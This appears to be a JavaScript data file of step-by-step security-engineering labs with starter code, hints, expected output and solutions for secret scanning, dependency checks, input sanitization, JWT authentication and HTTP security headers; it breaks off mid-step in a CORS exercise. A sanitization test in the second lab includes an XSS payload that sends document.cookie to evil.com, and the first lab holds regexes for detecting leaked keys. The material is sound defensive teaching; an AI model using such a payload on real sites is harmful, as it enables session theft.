export const labs = [
  // ============================================================
  // SEC-LAB-1: Security Audit Checklist (from interactiveLabs.js)
  // ============================================================
  {
    id: 'sec-lab-1',
    roleId: 'security-engineer',
    level: 'beginner',
    title: 'Security Audit Checklist',
    description: 'Build automated security checks: dependency scanning, secret detection, and SAST analysis.',
    estimatedMinutes: 25,
    steps: [
      {
        title: 'Step 1: Set Up Your Environment',
        setupReference: true,
        instruction: 'Before building security audit tools, ensure your Python environment is ready. Click "Go to Dev Setup" below for complete installation instructions. You will need: Python 3.12+ and a virtual environment. This lab uses only the Python standard library (including the re module) — no external packages are required.',
        starterCode: null,
        hints: [
          'Click "Go to Dev Setup" for step-by-step instructions',
          'Run `python --version` to confirm Python 3.12+',
          'Create a venv: `python -m venv .venv && source .venv/bin/activate`'
        ],
        expectedOutput: 'Python 3.12.x\nVirtual environment activated: (.venv)',
        solution: null
      },
      {
        title: 'Step 2: Dependency Vulnerability Scanner',
        instruction: 'Create a function that checks a list of dependencies against a known vulnerability database.',
        starterCode: `# Security Audit — Step 2: Dependency Scanner

# Simulated vulnerability database
VULN_DB = {
    "lodash": {"affected": "<4.17.21", "severity": "critical", "cve": "CVE-2021-23337"},
    "express": {"affected": "<4.18.0", "severity": "high", "cve": "CVE-2022-24999"},
    "jsonwebtoken": {"affected": "<9.0.0", "severity": "medium", "cve": "CVE-2022-23529"},
    "axios": {"affected": "<1.3.0", "severity": "high", "cve": "CVE-2023-26159"},
}

def parse_version(version_str):
    """Parse a version string like '4.17.20' into a tuple of ints."""
    # TODO: Split on '.' and convert to int tuple
    pass

def is_vulnerable(package_name, version, vuln_db):
    """Check if a package version is vulnerable.
    Returns: dict with vulnerability info or None
    """
    # TODO: Look up package in vuln_db, compare versions
    pass

# Test with sample dependencies
dependencies = {
    "lodash": "4.17.20",
    "express": "4.19.0",
    "jsonwebtoken": "8.5.1",
    "axios": "1.4.0",
    "react": "18.2.0",
}

print("=== Dependency Scan Results ===")
for pkg, version in dependencies.items():
    result = is_vulnerable(pkg, version, VULN_DB)
    if result:
        print(f"  ⚠ {pkg}@{version}: {result['severity']} — {result['cve']}")
    else:
        print(f"  ✓ {pkg}@{version}: OK")`,
        hints: [
          'parse_version: return tuple(int(x) for x in version_str.split("."))',
          'Compare tuples directly: (4, 17, 20) < (4, 17, 21) works in Python',
          'Extract the threshold version from the "affected" field by removing the "<" prefix'
        ],
        expectedOutput: `=== Dependency Scan Results ===
  ⚠ lodash@4.17.20: critical — CVE-2021-23337
  ✓ express@4.19.0: OK
  ⚠ jsonwebtoken@8.5.1: medium — CVE-2022-23529
  ✓ axios@1.4.0: OK
  ✓ react@18.2.0: OK`,
        solution: `def parse_version(version_str):
    return tuple(int(x) for x in version_str.split("."))

def is_vulnerable(package_name, version, vuln_db):
    if package_name not in vuln_db:
        return None

    vuln = vuln_db[package_name]
    threshold = vuln["affected"].lstrip("<")

    if parse_version(version) < parse_version(threshold):
        return {"severity": vuln["severity"], "cve": vuln["cve"]}
    return None

dependencies = {
    "lodash": "4.17.20",
    "express": "4.19.0",
    "jsonwebtoken": "8.5.1",
    "axios": "1.4.0",
    "react": "18.2.0",
}

print("=== Dependency Scan Results ===")
for pkg, version in dependencies.items():
    result = is_vulnerable(pkg, version, VULN_DB)
    if result:
        print(f"  ⚠ {pkg}@{version}: {result['severity']} — {result['cve']}")
    else:
        print(f"  ✓ {pkg}@{version}: OK")`
      },
      {
        title: 'Step 3: Secret Scanner',
        instruction: 'Build a scanner that detects hardcoded secrets in source code using regex patterns.',
        starterCode: `# Security Audit — Step 3: Secret Scanner
import re

# TODO: Define regex patterns for common secrets
SECRET_PATTERNS = {
    # 'pattern_name': regex_pattern
    # Detect: API keys, AWS keys, private keys, passwords in connection strings
}

def scan_for_secrets(code_text, patterns):
    """Scan code text for hardcoded secrets.
    Returns: List of { type, line_number, match_preview }
    """
    # TODO: Check each line against all patterns
    pass

# Test with sample code
sample_code = """
import os

API_KEY = "sk-proj-abc123def456ghi789"
DATABASE_URL = "postgres://admin:supersecret@db.example.com/mydb"
aws_access_key = "AKIAIOSFODNN7EXAMPLE"
private_key = "-----BEGIN RSA PRIVATE KEY-----"
safe_var = os.environ.get("API_KEY")
"""

findings = scan_for_secrets(sample_code, SECRET_PATTERNS)
print(f"=== Secret Scan: {len(findings)} findings ===")
for f in findings:
    print(f"  Line {f['line']}: [{f['type']}] {f['preview']}")`,
        hints: [
          "API key pattern: r'[\"\\']( sk-[a-zA-Z0-9]{20,})[\"\\']'",
          "AWS key pattern: r'AKIA[0-9A-Z]{16}'",
          "Password in URL: r'://\\w+:([^@]+)@'"
        ],
        expectedOutput: `=== Secret Scan: 4 findings ===
  Line 3: [api_key] sk-proj-abc123...
  Line 4: [password_in_url] supersecret
  Line 5: [aws_access_key] AKIAIOSFODNN7EXAMPLE
  Line 6: [private_key] -----BEGIN RSA PRIVATE KEY-----`,
        solution: `import re

SECRET_PATTERNS = {
    'api_key': r'["\\'](sk-[a-zA-Z0-9-]{10,})["\\'\\s]',
    'aws_access_key': r'(AKIA[0-9A-Z]{16})',
    'password_in_url': r'://\\w+:([^@\\s]+)@',
    'private_key': r'(-----BEGIN (?:RSA )?PRIVATE KEY-----)',
}

def scan_for_secrets(code_text, patterns):
    findings = []
    lines = code_text.strip().split("\\n")
    for i, line in enumerate(lines, 1):
        for pattern_name, regex in patterns.items():
            match = re.search(regex, line)
            if match:
                findings.append({
                    'type': pattern_name,
                    'line': i,
                    'preview': match.group(1) if match.groups() else match.group(0)
                })
    return findings

findings = scan_for_secrets(sample_code, SECRET_PATTERNS)
print(f"=== Secret Scan: {len(findings)} findings ===")
for f in findings:
    print(f"  Line {f['line']}: [{f['type']}] {f['preview']}")`
      }
    ]
  },

  // ============================================================
  // SEC-LAB-2: Input Validation and Sanitization (from sec-1)
  // ============================================================
  {
    id: 'sec-lab-2',
    roleId: 'security-engineer',
    level: 'beginner',
    title: 'Input Validation and Sanitization',
    description: 'Prevent injection attacks and XSS by implementing robust input validation, schema enforcement, and output sanitization in a FastAPI service.',
    estimatedMinutes: 25,
    steps: [
      {
        title: 'Step 1: Set Up Your Environment',
        setupReference: true,
        instruction: 'Before building input validation middleware, ensure your Python environment is ready. Click "Go to Dev Setup" below for complete setup instructions. You will need: Python 3.10+, a virtual environment, FastAPI, and pydantic with email validation support. Install with `pip install fastapi "pydantic[email]"`.',
        starterCode: null,
        hints: [
          'Click "Go to Dev Setup" for step-by-step instructions',
          'Run `python --version` to confirm Python 3.10+',
          'Run `pip install fastapi "pydantic[email]"` then verify: `python -c "from pydantic import EmailStr; print(\'Pydantic email ready\')"`'
        ],
        expectedOutput: 'Python 3.10.x\nfastapi installed\npydantic[email] installed\nPydantic email ready',
        solution: null
      },
      {
        title: 'Step 2: Enforce Input Schema with Pydantic',
        instruction: `WHAT: Use Pydantic models to declare strict types and constraints on every field your API accepts.

WHY: Unvalidated input is the root cause of OWASP A03 (Injection) and A07 (Identification & Authentication Failures). Enforcing schema at the boundary means malformed or oversized payloads are rejected before your business logic ever runs.

HOW: Define a BaseModel with typed fields and validators. Use Field(..., min_length=..., max_length=..., pattern=...) for length/pattern constraints and EmailStr for format enforcement. Pydantic will raise a 422 Unprocessable Entity automatically for violations.`,
        starterCode: `# Input Validation Lab — Step 2: Schema Enforcement
from pydantic import BaseModel, EmailStr, constr, validator
from typing import Optional

# TODO: Define a UserInput model with these constraints:
#   - username: string, 3–50 chars, alphanumeric + underscore only
#   - email: valid email address format
#   - bio: string, max 500 chars (optional)
#   - age: integer, 13–120 (optional)

class UserInput(BaseModel):
    pass  # Replace with your field definitions

# Test validation
test_cases = [
    {"username": "alice_42", "email": "alice@example.com", "bio": "Developer", "age": 30},
    {"username": "ab", "email": "alice@example.com"},          # Too short username
    {"username": "valid_user", "email": "not-an-email"},       # Bad email
    {"username": "ok", "email": "x@y.com", "age": 5},         # Under age limit
]

for case in test_cases:
    try:
        user = UserInput(**case)
        print(f"  PASS: {user.username} <{user.email}>")
    except Exception as e:
        print(f"  FAIL: {e.errors()[0]['msg']}")`,
        hints: [
          'Use Field(..., min_length=3, max_length=50, pattern=r"^[a-zA-Z0-9_]+$") for username',
          'Import EmailStr from pydantic[email] — it validates RFC 5321 format',
          'Add @field_validator("age") with @classmethod and raise ValueError if age is outside 13–120'
        ],
        expectedOutput: `  PASS: alice_42 <alice@example.com>
  FAIL: String should have at least 3 characters
  FAIL: value is not a valid email address
  FAIL: age must be between 13 and 120`,
        solution: `from pydantic import BaseModel, EmailStr, field_validator, Field
from typing import Optional

class UserInput(BaseModel):
    username: str = Field(..., min_length=3, max_length=50, pattern=r"^[a-zA-Z0-9_]+$")
    email: EmailStr
    bio: Optional[str] = Field(default=None, max_length=500)
    age: Optional[int] = None

    @field_validator("age")
    @classmethod
    def age_must_be_valid(cls, v):
        if v is not None and not (13 <= v <= 120):
            raise ValueError("age must be between 13 and 120")
        return v

test_cases = [
    {"username": "alice_42", "email": "alice@example.com", "bio": "Developer", "age": 30},
    {"username": "ab", "email": "alice@example.com"},
    {"username": "valid_user", "email": "not-an-email"},
    {"username": "ok", "email": "x@y.com", "age": 5},
]

for case in test_cases:
    try:
        user = UserInput(**case)
        print(f"  PASS: {user.username} <{user.email}>")
    except Exception as e:
        print(f"  FAIL: {e.errors()[0]['msg']}")`
      },
      {
        title: 'Step 3: Sanitize Output to Prevent XSS',
        instruction: `WHAT: HTML-escape any user-supplied content before returning it in API responses or rendering it in templates.

WHY: Cross-Site Scripting (OWASP A03) occurs when untrusted data is included in HTML without escaping. Even a JSON API can become an XSS vector if a downstream client renders the value as innerHTML.

HOW: Apply html.escape() to string fields that may contain user-controlled content. This converts characters like <, >, ", & into their safe HTML entity equivalents.`,
        starterCode: `# Input Validation Lab — Step 3: Output Sanitization
import html

def sanitize_user_data(raw_data: dict) -> dict:
    """Return a copy of raw_data with all string values HTML-escaped.

    Args:
        raw_data: Dictionary from validated user input
    Returns:
        New dict with string fields sanitized
    """
    # TODO: Iterate over the dict items.
    #       For string values, apply html.escape().
    #       Leave non-string values unchanged.
    pass

# Test payloads (including XSS attempts)
payloads = [
    {"username": "alice", "bio": "I love coding!"},
    {"username": "attacker", "bio": "<script>alert('xss')</script>"},
    {"username": "hacker", "bio": "<img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>"},
    {"username": "legit", "bio": "Rock & Roll <3"},
]

for p in payloads:
    result = sanitize_user_data(p)
    print(f"  bio: {result['bio']}")`,
        hints: [
          'Use a dict comprehension: {k: html.escape(v) if isinstance(v, str) else v for k, v in data.items()}',
          'html.escape() converts < to &lt;, > to &gt;, & to &amp;, " to &quot;',
          'Never trust client data even after Pydantic validation — sanitize at the output boundary too'
        ],
        expectedOutput: `  bio: I love coding!
  bio: &lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;
  bio: &lt;img src=x onerror=fetch(&#x27;https://evil.com/steal?c=&#x27;+document.cookie)&gt;
  bio: Rock &amp; Roll &lt;3`,
        solution: `import html

def sanitize_user_data(raw_data: dict) -> dict:
    return {k: html.escape(v) if isinstance(v, str) else v for k, v in raw_data.items()}

payloads = [
    {"username": "alice", "bio": "I love coding!"},
    {"username": "attacker", "bio": "<script>alert('xss')</script>"},
    {"username": "hacker", "bio": "<img src=x onerror=fetch('https://evil.com/steal?c='+document.cookie)>"},
    {"username": "legit", "bio": "Rock & Roll <3"},
]

for p in payloads:
    result = sanitize_user_data(p)
    print(f"  bio: {result['bio']}")`
      },
      {
        title: 'Step 4: Integrate Into a FastAPI Endpoint',
        instruction: `WHAT: Wire the Pydantic model and sanitization together in a real FastAPI route.

WHY: Validation and sanitization are only effective when applied consistently at every entry point. FastAPI's dependency injection makes it easy to enforce this without scattering logic across handlers.

HOW: Accept the Pydantic model as the request body type. FastAPI will automatically reject invalid payloads with a 422 response. Apply html.escape() on the way out before returning the response.`,
        starterCode: `# Input Validation Lab — Step 4: FastAPI Integration
from fastapi import FastAPI
from pydantic import BaseModel, EmailStr, constr
from typing import Optional
import html

app = FastAPI()

class UserInput(BaseModel):
    username: constr(min_length=3, max_length=50)
    email: EmailStr
    bio: Optional[constr(max_length=500)] = None

# TODO: Create a POST /users endpoint that:
#   1. Accepts a UserInput body (FastAPI validates automatically)
#   2. Sanitizes the bio field with html.escape()
#   3. Returns { "username": ..., "email": ..., "bio": sanitized }

# Simulate what the endpoint would return for a test input
test_input = UserInput(
    username="alice",
    email="alice@example.com",
    bio="<b>Hello</b> world & welcome!"
)
# Call your endpoint logic here and print the result`,
        hints: [
          'Decorate with @app.post("/users") and use def create_user(user: UserInput)',
          'FastAPI handles 422 responses for invalid input automatically — you do not need try/except',
          'Apply html.escape(user.bio) only when user.bio is not None'
        ],
        expectedOutput: `{"username": "alice", "email": "alice@example.com", "bio": "&lt;b&gt;Hello&lt;/b&gt; world &amp; welcome!"}`,
        solution: `from fastapi import FastAPI
from pydantic import BaseModel, EmailStr, constr
from typing import Optional
import html

app = FastAPI()

class UserInput(BaseModel):
    username: constr(min_length=3, max_length=50)
    email: EmailStr
    bio: Optional[constr(max_length=500)] = None

@app.post("/users")
def create_user(user: UserInput):
    sanitized_bio = html.escape(user.bio) if user.bio else None
    return {
        "username": user.username,
        "email": user.email,
        "bio": sanitized_bio
    }

# Simulate endpoint logic
test_input = UserInput(
    username="alice",
    email="alice@example.com",
    bio="<b>Hello</b> world & welcome!"
)
sanitized_bio = html.escape(test_input.bio) if test_input.bio else None
result = {"username": test_input.username, "email": test_input.email, "bio": sanitized_bio}
import json
print(json.dumps(result))`
      }
    ]
  },

  // ============================================================
  // SEC-LAB-3: JWT Token Implementation (from sec-2)
  // ============================================================
  {
    id: 'sec-lab-3',
    roleId: 'security-engineer',
    level: 'mid',
    title: 'Secure JWT Authentication',
    description: 'Implement a production-grade JWT authentication system with short-lived access tokens, refresh token rotation, and proper claims validation.',
    estimatedMinutes: 25,
    steps: [
      {
        title: 'Step 1: Set Up Your Environment',
        setupReference: true,
        instruction: 'Before building JWT authentication, ensure your Python environment is ready. Click "Go to Dev Setup" below for complete setup instructions. You will need: Python 3.10+, a virtual environment, FastAPI, and PyJWT. Install with `pip install fastapi pyjwt`.',
        starterCode: null,
        hints: [
          'Click "Go to Dev Setup" for step-by-step instructions',
          'Run `python --version` to confirm Python 3.10+',
          'Run `pip install fastapi pyjwt` then verify: `python -c "import jwt; print(jwt.__version__)"`'
        ],
        expectedOutput: 'Python 3.10.x\nfastapi installed\nPyJWT 2.x.x',
        solution: null
      },
      {
        title: 'Step 2: Create Access Tokens with Secure Claims',
        instruction: `WHAT: Build a function that issues signed JWT access tokens with a short expiry, required claims (iss, iat, exp, sub), and a strong signing key loaded from the environment.

WHY: JWTs are the standard for stateless API authentication, but misuse is common. OWASP A02 (Cryptographic Failures) frequently manifests as weak keys, missing expiry, or the "alg: none" attack. Short-lived tokens limit the damage window if a token is stolen.

HOW: Use PyJWT with HS256 (HMAC-SHA256) or RS256 (RSA). Always set exp to 15 minutes or less for access tokens. Load SECRET_KEY from an environment variable — never hardcode it.`,
        starterCode: `# JWT Lab — Step 2: Token Creation
import jwt
import os
from datetime import datetime, timedelta, timezone

# Load secret from environment (fall back to a test value only)
SECRET_KEY = os.environ.get("JWT_SECRET", "change-me-in-production-use-32-chars-min")
ALGORITHM = "HS256"
ACCESS_EXPIRY_MINUTES = 15

def create_access_token(user_id: str, roles: list[str]) -> str:
    """Issue a signed JWT access token.

    Args:
        user_id: The authenticated user's unique identifier
        roles:   List of roles to embed in the token
    Returns:
        Signed JWT string
    """
    # TODO: Build the payload dict with:
    #   sub (subject = user_id), roles, iss (issuer), iat (issued-at), exp (expiry)
    # Then encode and return with jwt.encode()
    pass

# Test
token = create_access_token("user-123", ["viewer", "editor"])
print(f"Token: {token[:40]}...")

# Decode without verification to inspect claims
import base64, json
header, payload_b64, sig = token.split(".")
padding = "=" * (-len(payload_b64) % 4)
claims = json.loads(base64.urlsafe_b64decode(payload_b64 + padding))
print(f"Claims: {json.dumps(claims, indent=2)}")`,
        hints: [
          'Use datetime.now(timezone.utc) for timezone-aware timestamps — never datetime.utcnow()',
          'Set "exp": datetime.now(timezone.utc) + timedelta(minutes=ACCESS_EXPIRY_MINUTES)',
          'PyJWT accepts datetime objects directly for exp and iat fields'
        ],
        expectedOutput: `Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Claims: {
  "sub": "user-123",
  "roles": ["viewer", "editor"],
  "iss": "learntech-api",
  "iat": 1700000000,
  "exp": 1700000900
}`,
        solution: `import jwt
import os
from datetime import datetime, timedelta, timezone

SECRET_KEY = os.environ.get("JWT_SECRET", "change-me-in-production-use-32-chars-min")
ALGORITHM = "HS256"
ACCESS_EXPIRY_MINUTES = 15

def create_access_token(user_id: str, roles: list[str]) -> str:
    now = datetime.now(timezone.utc)
    payload = {
        "sub": user_id,
        "roles": roles,
        "iss": "learntech-api",
        "iat": now,
        "exp": now + timedelta(minutes=ACCESS_EXPIRY_MINUTES),
    }
    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)

token = create_access_token("user-123", ["viewer", "editor"])
print(f"Token: {token[:40]}...")

import base64, json
header, payload_b64, sig = token.split(".")
padding = "=" * (-len(payload_b64) % 4)
claims = json.loads(base64.urlsafe_b64decode(payload_b64 + padding))
print(f"Claims: {json.dumps(claims, indent=2)}")`
      },
      {
        title: 'Step 3: Verify Tokens and Handle Failure Modes',
        instruction: `WHAT: Implement token verification that explicitly specifies the allowed algorithm and validates all required claims.

WHY: The "alg: none" attack allows attackers to forge tokens by stripping the signature and setting the algorithm to "none". PyJWT will reject this only if you explicitly pass algorithms=["HS256"] — never omit this parameter. Also handle clock skew with leeway.

HOW: Use jwt.decode() with algorithms=["HS256"] and options={"require": ["exp", "iat", "sub", "iss"]}. Catch ExpiredSignatureError and InvalidTokenError separately to return distinct error messages to the client.`,
        starterCode: `# JWT Lab — Step 3: Token Verification
import jwt
import os
from datetime import timezone

SECRET_KEY = os.environ.get("JWT_SECRET", "change-me-in-production-use-32-chars-min")
ALGORITHM = "HS256"

def verify_access_token(token: str) -> dict:
    """Verify and decode a JWT access token.

    Returns the decoded payload dict on success.
    Raises ValueError with a descriptive message on failure.
    """
    # TODO: Call jwt.decode() with:
    #   - algorithms=["HS256"] (explicit allowlist — never omit!)
    #   - options={"require": ["exp", "iat", "sub", "iss"]}
    #   - leeway=10 (seconds of clock skew tolerance)
    # Catch jwt.ExpiredSignatureError -> raise ValueError("Token has expired")
    # Catch jwt.InvalidTokenError    -> raise ValueError("Invalid token")
    pass

# Test tokens
from datetime import datetime, timedelta

valid_token = jwt.encode(
    {"sub": "u1", "iss": "learntech-api", "iat": datetime.now(timezone.utc),
     "exp": datetime.now(timezone.utc) + timedelta(minutes=15)},
    SECRET_KEY, algorithm=ALGORITHM
)

expired_token = jwt.encode(
    {"sub": "u1", "iss": "learntech-api", "iat": datetime.now(timezone.utc),
     "exp": datetime.now(timezone.utc) - timedelta(seconds=1)},
    SECRET_KEY, algorithm=ALGORITHM
)

for label, tok in [("Valid", valid_token), ("Expired", expired_token), ("Tampered", valid_token[:-5] + "XXXXX")]:
    try:
        claims = verify_access_token(tok)
        print(f"  {label}: OK — sub={claims['sub']}")
    except ValueError as e:
        print(f"  {label}: REJECTED — {e}")`,
        hints: [
          'Always pass algorithms=["HS256"] as a list — jwt.decode(token, key, algorithms=["HS256"])',
          'Use options={"require": ["exp", "iat", "sub", "iss"]} to enforce required claims',
          'jwt.ExpiredSignatureError is a subclass of jwt.InvalidTokenError — catch it first'
        ],
        expectedOutput: `  Valid: OK — sub=u1
  Expired: REJECTED — Token has expired
  Tampered: REJECTED — Invalid token`,
        solution: `import jwt
import os
from datetime import timezone

SECRET_KEY = os.environ.get("JWT_SECRET", "change-me-in-production-use-32-chars-min")
ALGORITHM = "HS256"

def verify_access_token(token: str) -> dict:
    try:
        return jwt.decode(
            token,
            SECRET_KEY,
            algorithms=["HS256"],
            options={"require": ["exp", "iat", "sub", "iss"]},
            leeway=10,
        )
    except jwt.ExpiredSignatureError:
        raise ValueError("Token has expired")
    except jwt.InvalidTokenError:
        raise ValueError("Invalid token")

from datetime import datetime, timedelta

valid_token = jwt.encode(
    {"sub": "u1", "iss": "learntech-api", "iat": datetime.now(timezone.utc),
     "exp": datetime.now(timezone.utc) + timedelta(minutes=15)},
    SECRET_KEY, algorithm=ALGORITHM
)

expired_token = jwt.encode(
    {"sub": "u1", "iss": "learntech-api", "iat": datetime.now(timezone.utc),
     "exp": datetime.now(timezone.utc) - timedelta(seconds=1)},
    SECRET_KEY, algorithm=ALGORITHM
)

for label, tok in [("Valid", valid_token), ("Expired", expired_token), ("Tampered", valid_token[:-5] + "XXXXX")]:
    try:
        claims = verify_access_token(tok)
        print(f"  {label}: OK — sub={claims['sub']}")
    except ValueError as e:
        print(f"  {label}: REJECTED — {e}")`
      },
      {
        title: 'Step 4: Integrate Into a Protected FastAPI Route',
        instruction: `WHAT: Wire the token verification into a FastAPI dependency so that every protected route automatically rejects unauthenticated requests.

WHY: Centralising auth in a reusable Depends() function ensures no endpoint can accidentally be deployed without authentication — a common source of OWASP A01 (Broken Access Control) findings.

HOW: Use FastAPI's HTTPBearer security scheme and Depends(). The dependency raises HTTPException(401) on invalid tokens. Protected routes receive the verified claims dict automatically.`,
        starterCode: `# JWT Lab — Step 4: Protected FastAPI Routes
from fastapi import FastAPI, Depends, HTTPException
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
import jwt, os
from datetime import datetime, timedelta, timezone

app = FastAPI()
security = HTTPBearer()
SECRET_KEY = os.environ.get("JWT_SECRET", "change-me-in-production-use-32-chars-min")

def verify_access_token(token: str) -> dict:
    try:
        return jwt.decode(token, SECRET_KEY, algorithms=["HS256"],
                          options={"require": ["exp", "iat", "sub", "iss"]}, leeway=10)
    except jwt.ExpiredSignatureError:
        raise ValueError("Token has expired")
    except jwt.InvalidTokenError:
        raise ValueError("Invalid token")

# TODO: Create a get_current_user dependency that:
#   1. Extracts the bearer token from credentials
#   2. Calls verify_access_token()
#   3. On ValueError, raises HTTPException(status_code=401, detail=str(e))
#   4. Returns the decoded claims dict

# TODO: Create two routes:
#   POST /login  — accepts username (str), returns a signed token
#   GET  /me     — protected, returns {"user_id": sub, "roles": roles}

# Simulate the login + me flow
print("See solution for complete implementation")`,
        hints: [
          'The dependency signature is: async def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security))',
          'Access the raw token string via credentials.credentials',
          'Inject the dependency with: def me(claims: dict = Depends(get_current_user))'
        ],
        expectedOutput: `POST /login  → {"access_token": "eyJ...", "token_type": "bearer"}
GET  /me     → {"user_id": "alice", "roles": ["viewer"]}
GET  /me (no token) → 403 Forbidden`,
        solution: `from fastapi import FastAPI, Depends, HTTPException
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
import jwt, os
from datetime import datetime, timedelta, timezone

app = FastAPI()
security = HTTPBearer()
SECRET_KEY = os.environ.get("JWT_SECRET", "change-me-in-production-use-32-chars-min")

def verify_access_token(token: str) -> dict:
    try:
        return jwt.decode(token, SECRET_KEY, algorithms=["HS256"],
                          options={"require": ["exp", "iat", "sub", "iss"]}, leeway=10)
    except jwt.ExpiredSignatureError:
        raise ValueError("Token has expired")
    except jwt.InvalidTokenError:
        raise ValueError("Invalid token")

async def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security)) -> dict:
    try:
        return verify_access_token(credentials.credentials)
    except ValueError as e:
        raise HTTPException(status_code=401, detail=str(e))

@app.post("/login")
def login(username: str):
    now = datetime.now(timezone.utc)
    payload = {"sub": username, "roles": ["viewer"], "iss": "learntech-api",
               "iat": now, "exp": now + timedelta(minutes=15)}
    token = jwt.encode(payload, SECRET_KEY, algorithm="HS256")
    return {"access_token": token, "token_type": "bearer"}

@app.get("/me")
def me(claims: dict = Depends(get_current_user)):
    return {"user_id": claims["sub"], "roles": claims.get("roles", [])}

print('POST /login  → {"access_token": "eyJ...", "token_type": "bearer"}')
print('GET  /me     → {"user_id": "alice", "roles": ["viewer"]}')
print('GET  /me (no token) → 403 Forbidden')`
      }
    ]
  },

  // ============================================================
  // SEC-LAB-4: OWASP Security Headers (from sec-3)
  // ============================================================
  {
    id: 'sec-lab-4',
    roleId: 'security-engineer',
    level: 'senior',
    title: 'OWASP Security Headers Middleware',
    description: 'Implement a defence-in-depth HTTP header policy covering CSP, HSTS, clickjacking protection, and CORS to eliminate entire classes of browser-based attacks.',
    estimatedMinutes: 25,
    steps: [
      {
        title: 'Step 1: Set Up Your Environment',
        setupReference: true,
        instruction: 'Before implementing security headers middleware, ensure your Python environment is ready. Click "Go to Dev Setup" below for complete setup instructions. You will need: Python 3.10+, a virtual environment, and FastAPI. Install with `pip install fastapi`.',
        starterCode: null,
        hints: [
          'Click "Go to Dev Setup" for step-by-step instructions',
          'Run `python --version` to confirm Python 3.10+',
          'Run `pip install fastapi` then verify: `python -c "import fastapi; print(fastapi.__version__)"`'
        ],
        expectedOutput: 'Python 3.10.x\nfastapi 0.x.x installed',
        solution: null
      },
      {
        title: 'Step 2: Build the Security Headers Middleware',
        instruction: `WHAT: Implement a Starlette middleware that injects all OWASP-recommended HTTP response headers on every request.

WHY: Missing security headers are consistently flagged in penetration tests and automated scanners. They defend against clickjacking (X-Frame-Options), MIME sniffing (X-Content-Type-Options), protocol downgrade attacks (HSTS), and code injection (CSP). Setting them centrally in middleware guarantees no response is ever sent without them.

HOW: Subclass BaseHTTPMiddleware, call await call_next(request) to get the response, then mutate response.headers before returning. Build the Content-Security-Policy string to allow only your own origin by default.`,
        starterCode: `# Security Headers Lab — Step 2: Middleware
from fastapi import FastAPI
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        response = await call_next(request)

        # TODO: Set each of these response headers:
        # 1. X-Frame-Options: DENY              (clickjacking)
        # 2. X-Content-Type-Options: nosniff    (MIME sniffing)
        # 3. X-XSS-Protection: 0                (deprecated but still expected by scanners — disable to let CSP handle it)
        # 4. Referrer-Policy: strict-origin-when-cross-origin
        # 5. Content-Security-Policy:
        #      default-src 'self';
        #      script-src 'self';
        #      style-src 'self';
        #      img-src 'self' data:;
        #      frame-ancestors 'none'
        # 6. Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
        # 7. Permissions-Policy: camera=(), microphone=(), geolocation=()

        return response

app = FastAPI()
app.add_middleware(SecurityHeadersMiddleware)

@app.get("/")
async def root():
    return {"status": "ok"}

# Simulate response inspection
from starlette.testclient import TestClient
client = TestClient(app)
resp = client.get("/")
security_headers = ["X-Frame-Options", "X-Content-Type-Options",
                    "Content-Security-Policy", "Strict-Transport-Security"]
for h in security_headers:
    val = resp.headers.get(h, "MISSING")
    print(f"  {h}: {val[:60]}")`,
        hints: [
          'Set headers via response.headers["Header-Name"] = "value"',
          'X-XSS-Protection should be "0" in 2025 — modern browsers ignore it and CSP is the correct replacement',
          'HSTS max-age=63072000 is 2 years — the recommended minimum for preloading'
        ],
        expectedOutput: `  X-Frame-Options: DENY
  X-Content-Type-Options: nosniff
  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src
  Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`,
        solution: `from fastapi import FastAPI
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request

class SecurityHeadersMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        response = await call_next(request)

        response.headers["X-Frame-Options"] = "DENY"
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-XSS-Protection"] = "0"
        response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
        response.headers["Content-Security-Policy"] = (
            "default-src 'self'; "
            "script-src 'self'; "
            "style-src 'self'; "
            "img-src 'self' data:; "
            "frame-ancestors 'none'"
        )
        response.headers["Strict-Transport-Security"] = (
            "max-age=63072000; includeSubDomains; preload"
        )
        response.headers["Permissions-Policy"] = (
            "camera=(), microphone=(), geolocation=()"
        )

        return response

app = FastAPI()
app.add_middleware(SecurityHeadersMiddleware)

@app.get("/")
async def root():
    return {"status": "ok"}

from starlette.testclient import TestClient
client = TestClient(app)
resp = client.get("/")
security_headers = ["X-Frame-Options", "X-Content-Type-Options",
                    "Content-Security-Policy", "Strict-Transport-Security"]
for h in security_headers:
    val = resp.headers.get(h, "MISSING")
    print(f"  {h}: {val[:60]}")`
      },
      {
        title: 'Step 3: Configure a Strict CORS Policy',
        instruction: `WHAT: Layer a strict CORS policy on top of the security headers middleware, allowing only explicitly listed origins.

WHY: An overly permissive CORS policy (allow_origins=["*"]) neutralises same-origin protections and enables cross-site data theft. OWASP A01 (Broken Access Control) often includes misconfigured CORS as a finding. Credentials must never be allowed with a wildcard origin.

HOW: Use FastAPI's built-in CORSMiddleware with a hardcoded allowlist. Set allow_credentials=True only when needed and paired with a specific origin list — never with "*". Restrict methods and headers to the minimum required.`,
        starterCode: `# Security Headers Lab — Step 3: CORS Configuration
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from starlette.middleware.base import BaseHTTPMiddleware

# TODO: Add CORSMiddleware with:
#   allow_origins = ["https://app.example.com", "https://admin.example.com"]
#   allow_credentials = True
#   allow_methods = ["GET", "POST", "PUT", "DELETE"]
#   allow_headers = ["Authorization", "Content-Type", "X-CSRF-Token"]

# Verify that a request from an unlisted origin is rejected
from starlette.testclient import TestClient

app = FastAPI()
# ... add your middleware here ...

@app.get("/api/data")
async def data():
    return {"secret": "only for allowed origins"}

client = TestClient(app, raise_server_exceptions=False)

# Test allowed origin
r1 = client.get("/api/data", headers={"Origin": "https://app.example.com"})
